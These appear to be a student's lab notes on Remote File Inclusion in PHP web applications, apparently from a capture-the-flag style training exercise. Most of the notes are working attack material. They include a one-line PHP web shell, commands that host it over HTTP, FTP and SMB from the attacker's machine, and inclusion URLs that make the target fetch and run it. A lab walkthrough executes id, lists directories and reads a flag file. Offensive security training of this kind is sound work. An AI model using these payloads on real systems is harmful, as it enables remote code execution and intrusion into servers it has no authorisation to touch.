# Remote File Inclusion (RFI)

Remote File Inclusion : certain functions allow the injection of a remote file which is not present on the web server

Local vs. Remote File Inclusion

Function	Read Content	Execute	Remote URL

PHP			

include()/include_once()	✅	✅	✅

file_get_contents()	✅	❌	✅

Java			

import	✅	✅	✅

.NET			

@Html.RemotePartial()	✅	❌	✅

include	✅	✅	✅


## Checking PHP Configurations

--> User CURL or BURP because the response can be very long

echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
allow_url_include = On

## Verify RFI

http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php

## Remote Code Execution with RFI

echo '<?php system($_GET["cmd"]); ?>' > shell.php

### HTTP

sudo python3 -m http.server <LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...

http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id

### FTP

sudo python -m pyftpdlib -p 21
[SNIP] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<<
[SNIP] concurrency model: async
[SNIP] masquerade (NAT) ad
dress: None
[SNIP] passive ports: None

http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id

If the server requires valid authentication, then the credentials can be specified in the URL, as follows:

curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
...SNIP...
uid=33(www-data) gid=33(www-data) groups=33(www-data)

### SMB

If the vulnerable web application is hosted on a Windows server :

impacket-smbserver -smb2support share $(pwd)
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami


--> more likely to work if we were on the same network


## LAB

http://10.129.227.136

http://10.129.227.136/index.php?language=http://127.0.0.1:80/index.php

--> OK vulnerable to RFI

echo '<?php system($_GET["cmd"]); ?>' > shell.php

sudo python3 -m http.server 8081

http://10.129.227.136/index.php?language=http://10.10.15.217:8081/shell.php&cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
Notice: Undefined variable: p2 in /var/www/html/index.php on line 48

--> OK

http://10.129.227.136/index.php?language=http://10.10.15.217:8081/shell.php&cmd=ls%20-l%20/

total 76 

drwxr-xr-x 1 root root 4096 Nov 5 2020 bin 
drwxr-xr-x 2 root root 4096 Apr 24 2018 boot 
drwxr-xr-x 5 root root 340 Dec 31 18:13 dev 
drwxr-xr-x 1 root root 4096 Nov 5 2020 etc 
drwxr-xr-x 1 www-data www-data 4096 Nov 5 2020 exercise 
drwxr-xr-x 2 root root 4096 Apr 24 2018 home 
drwxr-xr-x 1 root root 4096 May 23 2017 lib 
drwxr-xr-x 2 root root 4096 Sep 21 2020 lib64 
drwxr-xr-x 2 root root 4096 Sep 21 2020 media 
drwxr-xr-x 2 root root 4096 Sep 21 2020 mnt 
drwxr-xr-x 2 root root 4096 Sep 21 2020 opt 
dr-xr-xr-x 188 root root 0 Dec 31 18:13 proc 
drwx------ 2 root root 4096 Sep 21 2020 root 
drwxr-xr-x 1 root root 4096 Nov 5 2020 run 
drwxr-xr-x 1 root root 4096 Sep 25 2020 sbin 
drwxr-xr-x 2 root root 4096 Sep 21 2020 srv 
dr-xr-xr-x 13 root root 0 Dec 31 18:13 sys 
drwxrwxrwt 1 root root 4096 Dec 31 18:13 tmp 
drwxr-xr-x 1 root root 4096 Sep 21 2020 usr 
drwxr-xr-x 1 root root 4096 Nov 5 2020 var
Notice: Undefined variable: p2 in /var/www/html/index.php on line 48

http://10.129.227.136/index.php?language=http://10.10.15.217:8081/shell.php&cmd=ls%20-l%20/exercise/

total 4 -rw-r--r-- 1 root root 33 Nov 5 2020 flag.txt
Notice: Undefined variable: p2 in /var/www/html/index.php on line 48

http://10.129.227.136/index.php?language=http://10.10.15.217:8081/shell.php&cmd=cat%20/exercise/flag.txt